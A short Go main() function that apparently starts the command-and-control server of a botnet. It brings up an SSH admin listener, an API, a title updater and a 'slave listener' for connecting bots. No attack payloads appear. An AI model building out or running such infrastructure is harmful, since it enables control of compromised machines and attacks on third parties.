package main

import (
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"
)

var buildversion = 9.2

func main() {
	fmt.Printf("Welcome back root! %s\r\n", Version)

	if err := OpenConfig(Options, "assets", "server.toml"); err != nil {
		log.Fatalf("Config: %v", err)
	}

	if err := SpawnSQL(); err != nil {
		log.Fatalf("Config: %v", err)
	}

	rand.Seed(time.Now().UnixNano())

	// Initialize shared services before starting network listeners.
	OnStart()
	// ... después de OnStart() ...
	go startWorkerServer()

	// SSH is the only admin access path.
	go NewAPI() // Start the API server in a separate goroutine
	go Title()  // Start the title updater in a separate goroutine
	sshListener := strings.TrimSpace(Options.Templates.Server.Listener)
	if sshListener == "" {
		sshListener = ":1338"
	}
	go startSSHServer(sshListener)

	if err := initGeoIP(); err != nil {
		log.Fatalf("Failed to init GeoIP: %v", err)
	}

	// Execute the main slave listener
	if err := Slave(); err != nil {
		log.Fatalf("Config: %v", err)
	}
	select {}

}
